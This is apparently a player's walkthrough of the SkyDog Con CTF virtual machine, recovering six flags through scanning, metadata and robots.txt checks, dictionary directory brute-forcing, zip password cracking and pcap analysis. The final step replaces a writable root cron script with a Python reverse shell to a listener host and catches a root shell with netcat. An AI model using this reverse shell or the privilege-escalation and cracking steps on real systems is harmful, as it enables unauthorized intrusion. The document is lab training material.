# SkyDog Con CTF - The Legend Begins
## Flag 1 
Find virtualbox in network:
```sh
$ nmap 192.168.0.0/24
Nmap scan report for 192.168.0.101
Host is up (0.00030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
So, open 80 port in browser and get image.
Try to get metadata from image with exiftool:
```sh
$ exiftool SkyDogCon_CTF.jpg 
ExifTool Version Number         : 9.74
File Name                       : SkyDogCon_CTF.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:18 14:35:25+03:00
File Access Date/Time           : 2017:07:10 22:36:40+03:00
File Inode Change Date/Time     : 2017:07:10 22:36:33+03:00
File Permissions                : rw-rw-r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Exif Byte Order                 : Big-endian (Motorola, MM)
Software                        : Adobe ImageReady
XP Comment                      : flag{abc40a2d4e023b42bd1ff04891549ae2}
Padding                         : (Binary data 2060 bytes, use -b option to extract)
Image Width                     : 900
Image Height                    : 525
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 900x525
```
### flag{abc40a2d4e023b42bd1ff04891549ae2}
Trying to break flag hash with crackstation: md5(Welcome Home)
## Flag 2 
Open robots.txt and get the next flag:
### flag{cd4f10fcba234f0e8b2f60a490c306e6}
md5 from flag is Bots
## Flag 3
Running nikto on web application:
```sh
$ nikto -host 192.168.0.101
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.0.101
+ Target Hostname:    192.168.0.101
+ Target Port:        80
+ Start Time:         2017-07-10 22:52:16 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2b 0x5200b3f35ee65 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ File/dir '/index.html?' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/?/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/?hl=/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/?hl=*&/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/?hl=*&gws_rd=ssl$/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/?hl=*&*&gws_rd=ssl/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/?gws_rd=ssl$/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/?pt1=true$/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/Setec/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 299 entries which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2017-07-10 22:52:28 (GMT3) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Get an image from /Setec/ give no any information. Google for "too many secrets" give a hint with film "The sneakers". Load movie script, make a dictionary and run dirbuster.
```sh
tr -cs 'a-zA-Z0-9' '\n' <sneakers-script-transcript-robert-redford.html >>dict.txt
```
Dirbuster shows a lot of interesting information:
```sh
http://192.168.0.101/PlayTronics/flag.txt
```
### flag{c07908a705c22922e6d416e0e1107d99}
md5 - leroybrown
## Flag 4
From dirbuster get zip file:
```sh
http://192.168.0.101/Setec/Astronomy/Whistler.zip
```
But it is encrypted.
Trying to crack it:
```sh
$ fcrackzip -D -p rockyou.txt -u Whistler.zip 
PASSWORD FOUND!!!!: pw == yourmother
```
### flag{1871a3c1da602bf471d3d76cc60cdb9b}
yourmother
## Flag 5
Open pcap file with wireshark (http://192.168.0.101/PlayTronics/companytraffic.pcap) and extract media file.
Linstening it get :  
                  Hi. My name is Werner Brandes.
                  My voice is my passport.  Verify me. Thank you.
So try to log in with this name and with some hash from previous flags:
correct name:password : wernerbrandes:leroybrown
For future: do not do this manually. make a dictionary
```sh
~$ ls
2.py  flag.txt
wernerbrandes@skydogctf:~$ cat flag.txt 
```
### flag{82ce8d8f5745ff6849fa7af1473c9b35}
hash result not found

## Flag 6
We see python script which makes system call with shell and cron task with root privilege in list of processes. Wait a lot - and nothing happens. Try to find another file:
```sh
$ find / -writable -type f 2> /dev/null
/lib/log/sanitizer.py
```
So, change it a little:
```sh
#!/usr/bin/env python
import os
import sys

import socket
import subprocess	
import os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.103", 12345))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
#try:
#	os.system('rm -r /tmp/* ')
#except:
#	sys.exit()

```
And listen port on host machine: 
```sh
$ nc -l 192.168.0.103 12345
/bin/sh: 0: can't access tty; job control turned off
# ls
BlackBox
# cd BlackBox
# ls
flag.txt
# cat flag.txt
flag{b70b205c96270be6ced772112e7dd03f}

Congratulations!! Martin Bishop is a free man once again!  Go here to receive your reward.
/CongratulationsYouDidIt# 

```